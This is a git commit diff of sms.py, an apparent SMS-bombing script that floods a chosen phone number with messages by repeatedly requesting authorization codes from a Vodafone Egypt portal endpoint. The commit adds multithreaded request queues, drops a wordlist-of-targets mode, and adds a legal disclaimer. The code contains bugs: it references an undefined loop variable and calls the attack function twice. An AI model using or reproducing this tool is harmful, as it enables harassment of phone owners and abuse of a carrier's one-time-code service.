cf8fd0a78494aa93e67a2711096aedf88092ac27
Khaled Nassar <45688522+knassar702@users.noreply.github.com>
2020-01-27 13:41:34 +0200

    Update sms.py

--- sms.py
+++ sms.py
@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
-import requests,time
+import requests,time,threading
+from queue import Queue
 from optparse import OptionParser
 l1st = None
 num = None
+q = Queue()
 def getargs():
 	global num,l1st,thr,kam
 	optp = OptionParser(add_help_option=False)
 	optp.add_option("-n","--number",dest='num')
-	optp.add_option("-l","--list",dest="l1st",type='str')
 	optp.add_option("-h","--help",dest="helper",action='store_true')
 	optp.add_option("-m","--many",dest='kam',type='int')
+	optp.add_option("-t","--threads",dest='thr',type='int')
 	opts, args = optp.parse_args()
 	if opts.num:
 		num = opts.num
@@ -17,21 +19,18 @@ def getargs():
 		print("""Options:
 -h, --help         | show this help menu
 -n, --number=NUM   | Add The number of target
--l, --list=LIST    | Get All Numbers of targets from wordlist
 -m, --many=10      | How many messages you want send it
+-t, --threads=10   | Max number of concurrent HTTP(s) requests (default 10)
 """)
-		exit()
-	if opts.l1st:
-		l1st = opts.l1st
-	if opts.num !=None and opts.l1st != None:
-		print("[-] Sorry you can't user --number and --list in one one process ..!!")
 		exit()
 	if opts.kam:
 		kam = opts.kam
 	else:
 		kam = 5
-	if opts.num ==None and opts.l1st == None:
-		print('[-] Add number or list for start ..!')
+	if opts.thr:
+		thr = opts.thr
+	if opts.num ==None:
+		print('[-] Add The number for start ..!')
 		exit()
 def logo():
 	print("""\033[91m
@@ -42,40 +41,37 @@ def logo():
 \t|___/\____/\__,_/\__,_//____/  
 \t                               
 \t\033[93m# Coded By : Khaled Nassar @Knassar702\033[0m\n
+[!] legal disclaimer: Usage of Vodas for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 """)
 	time.sleep(1)
-def exploit(number=None,word_list=None):
+def go(number):
+	try:
+		r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number)})
+		print(f"[+] Success | {number} | {i}")
+	except:
+		print("[-]")
+def threader():
+	while True:
+		item = q.get()
+		go(item)
+		q.task_done()
+def exploit(number=None,thr=10):
 	if number:
 		print(f"[!] Starting\n[!] How many messages [{kam}]\n<------------------->")
-		time.sleep(0.8)
-		try:
-			for i in range(kam):
-				r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number)})
-				print(f"[+] Success | {number} | {i}")
-		except:
-			print("[-] Connection Error ..!")
-			exit()
-	elif word_list:
-		try:
-			f = open(word_list,'r')
-		except:
-			print('[-] Error .. i cant find your word list ..!')
-			exit()
-		print(f"[!] Starting\n[!] How many messages {kam}\n[!] List : [{l1st}]\n<------------------->")
-		for number in f:
-			for i in range(kam):
-				try:
-					r = requests.get('https://cloudportal.vodafone.com.eg/portal/login/sendauthorizationcode',params={'mobileNumber':str(number.strip())})
-					print(f'[+] Success | {number.strip()}')
-				except:
-					print('[-] Connection Error ..!')
-					exit()
+		for i in range(thr):
+			p1 = threading.Thread(target=threader)
+			p1.daemon = True
+			p1.start()
+		for i in range(kam):
+			q.put(number)
+		q.join()
+		exit()
 if __name__ == '__main__':
 	logo()
 	getargs()
-	if l1st:
-		exploit(word_list=l1st)
-	elif num:
-		exploit(number=num)
+	if num:
+		if thr:
+			exploit(number=num,thr=thr)
+		exploit(number=num,thr=thr)
 	else:
 		exit()
